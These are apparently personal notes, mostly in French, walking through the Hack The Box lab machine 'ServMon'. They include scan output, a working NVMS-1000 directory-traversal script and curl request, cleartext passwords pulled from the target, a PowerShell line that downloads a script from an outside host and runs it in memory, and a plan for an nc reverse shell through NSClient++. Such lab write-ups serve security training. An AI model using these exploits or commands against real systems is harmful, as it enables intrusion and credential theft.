\chapter{ServMon}
\begin{itemize}
    \item {\bf technics}: \gls{t:lfi}, \gls{t:pivoting}
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Discovery}

\subsubsection{namp}
\begin{verbatim}
$ sudo nmap -sV -sC -oX sermon.xml 10.10.10.184
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 04:23 CEST
Nmap scan report for 10.10.10.184
Host is up (0.16s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   X11Probe: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=9/15%Time=63228CBD%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nCon
SF:tent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xe
SF:f\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\
SF:x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-tra
SF:nsitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtm
SF:l\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<s
SF:cript\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20w
SF:indow\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20
SF:</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(HTTPOption
SF:s,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-
SF:Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb
SF:\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Tr
SF:ansitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transiti
SF:onal\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script
SF:\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window
SF:\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</scr
SF:ipt>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RTSPRequest,1B4
SF:,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\nContent-Lengt
SF:h:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n\xef\xbb\xbf<
SF:!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Transit
SF:ional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-transitional\
SF:.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\r\n<h
SF:ead>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x20<script\x20t
SF:ype=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x20window\.loc
SF:ation\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\x20</script>\
SF:r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(X11Probe,6B,"HTTP/1\
SF:.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/html\r\nConten
SF:t-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=9/15%Time=63228CC4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\xee\0\0\0\0\0\0\0M\x02\0\
SF:0\0\0\0\0\0\0\0\0s\0d\0a\0y\0:\0T\0h\0u\0:\0T\0h\0u\0r\0s\0")%r(HTTPOpt
SF:ions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20n
SF:ot\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\
SF:x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIP
SF:Options,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
SF:20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-09-15T02:25:52
|_  start_date: N/A

\end{verbatim}

\subsubsection{ftp}

\begin{verbatim}
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and
place it back into the secure folder.

Regards

Nadine

1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
\end{verbatim}

\subsubsection{smb}
rien pour le moment
\subsection{http}
nvms-1000 login page

\begin{verbatim}
$ searchsploit nvms

NVMS 1000 - Directory Traversal                     | hardware/webapps/47774.txt
OpenVms 5.3/6.2/7.x - UCX POP Server Arbitrary File Modification | multiple/local/21856.txt
OpenVms 8.3 Finger Service - Stack Buffer Overflow | multiple/dos/32193.txt
TVT NVMS 1000 - Directory Traversal                | hardware/webapps/48311.py

\end{verbatim}

Unifies all the CCTV cameras available in the network and provides management,
recording, playback and various video-surveillance features. Controls the video
input signal for cameras, domes, and customizes the live monitoring, video
recording and backup of the video data.

n'a pas l'air vulnerable au directory traversal

sqlmap ?

quand on regarde la requete de login en fait on à un basic auth + un cookie
space

\begin{verbatim}
POST /doLogin HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
If-Modified-Since: 0
Authorization: Basic YWRtaW46YWRtaW4=
Content-Type: text/plain;charset=UTF-8
Content-Length: 103
Origin: http://10.10.10.184
DNT: 1
Connection: keep-alive
Referer: http://10.10.10.184/Pages/login.htm
Cookie: dataPort=6063

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-1000" clientType="WEB"/>
\end{verbatim}

l'auth est un simple base64 login:passwd

dataport ? on va check sur nmap
\begin{verbatim}
$ sudo nmap -sV -sC -p6063 10.10.10.184
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-15 05:10 CEST
Nmap scan report for 10.10.10.184
Host is up (0.053s latency).

PORT     STATE SERVICE    VERSION
6063/tcp open  tcpwrapped
\end{verbatim}

les credentials on été créés pour Nathan on peut essayer deja avec ce login de
brutforce avec \verb+hydra+

Hydra ne permet pas de générer ce genre de requetes \verb+basic auth+ avec
\verb+post payload+ donc soit burp/zaproxy soit dev specifique

en fait le directory traversal fonctionne c'est juste que le fichier n'est pas
le bon
\begin{verbatim}
$ python ./48311.py http://10.10.10.184/ windows/system32/drivers/etc/hosts
200
OK
<RequestsCookieJar[]>
{'Content-type': 'text/xml', 'Content-Length': '118', 'Connection': 'close', 'AuthInfo': ''}
b'<?xml version="1.0" encoding="UTF-8"?>\n<response>\t<status>fail</status>\n\t<errorCode>536870934</errorCode>\n</response>\n'
\end{verbatim}

mais

\begin{verbatim}
$ python ./48311.py http://10.10.10.184/ windows/win.ini
404
Not Found
<RequestsCookieJar[]>
{'Content-type': 'text/html', 'Content-Length': '0', 'Connection': 'close', 'AuthInfo': ''}
b''
\end{verbatim}

\begin{verbatim}
$ python ./48311.py http://10.10.10.184/ users/nathan/desktop/password.txt
404
Not Found
<RequestsCookieJar[]>
{'Content-type': 'text/html', 'Content-Length': '0', 'Connection': 'close', 'AuthInfo': ''}
b''
\end{verbatim}

test si c'est un problème d'encodage

\begin{verbatim}
$ curl \
    "http://10.10.10.184/%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini"
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
\end{verbatim}

donc on remplace comme cela:
\begin{verbatim}
import sys
import requests
import os
import time

if len(sys.argv) !=3:
        print( "  ")
        print("Usage : python exploit.py url filename outputname")
        print("Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini")
        print(" ")
else:


        traversal = "../../../../../../../../../../../../../"
        filename = sys.argv[2]
        filename = sys.argv[2]
        url = sys.argv[1]+ traversal.replace("/","%2F") + filename.replace("/","%2F")
        content = requests.get(url)
        print(content.status_code)
        print(content.reason)
        print(content.cookies)
        print(content.headers)
        print(content.content)

\end{verbatim}

\begin{verbatim}
$ python 48311.py http://10.10.10.184/ "Users/Nathan/Desktop/Passwords.txt"

1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
\end{verbatim}

\begin{verbatim}
$ python 48311.py http://10.10.10.184/ "Users/Nathan/.ssh/id_rsa"
404
\end{verbatim}

essayons de se logger au site

essayons sur le ssh. Rien avec nathan mais
\verb+nadine / L1k3B1gBut7s@W0rk+ marche.

\begin{verbatim}
searchsploit nsclient
\end{verbatim}

follow \verb+searchsploit -m 46802+

\begin{verbatim}
adine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
ï»¿# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
...

cmd /c "C:\Program Files\NSClient++\nscp.exe" --version


## download Get-ServiceACL.ps1 to the box and execute in memory
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open(
    'GET','http://10.10.14.2/Get-ServiceACL.ps1',$false);
    $h.send();iex $h.responseText
## examine nscp service ACL
"nscp" | Get-ServiceAcl | select -ExpandProperty Access
\end{verbatim}

ne marche pas

en revanche on peut creer un \verb+.bat+ qui rexecute un reverse shell
(\verb+nc+)

on peut télécharger cela sur \verb+mkdir c:\temp+

sur l'interface qui ne tourne qu'en local en http 8443 (que l'on atteint avec
    un ssh local port foward on peut demander l'execution du bat en créant un
    script en reloadant l'appli (via le control) puis dans query on peut
    demander l'execution.

\section{Theorie}


